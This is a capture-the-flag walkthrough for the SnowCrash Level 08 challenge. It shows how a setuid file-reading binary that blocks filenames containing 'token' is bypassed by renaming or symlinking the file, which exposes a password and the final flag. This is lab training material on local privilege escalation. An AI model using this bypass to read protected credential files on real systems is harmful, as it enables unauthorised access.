# Level 08

## Vulnerability
Privilege escalation - weak filename check

## Context
```
level08@SnowCrash:~$ ls -l
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

## Solution
```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```
Ok lets create a file to read.
```
level08@SnowCrash:~$ echo "oh hi" > /dev/shm/hi
level08@SnowCrash:~$ ./level08 /dev/shm/hi
oh hi
```
Looks like the binary ```level08``` prints the contents of a file given as argument. We don't have permissions to read token directly, will ```level08``` read ```token``` for us?
```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```
Hmm, why not?
```
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff794, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                    = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                = 27
exit(1 <unfinished ...>
```
It seems like it calls strstr to see if "token" is contained in the filename, and rejects access if true. So what if we simply change the filename? (An alternative is to create a symlink ```ln -s token password```)
```
level08@SnowCrash:~$ mv token password
level08@SnowCrash:~$ ./level08 password
quif5eloekouj29ke0vouxean
```
Great! Lets log in to flag08 and launch getflag.
```
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
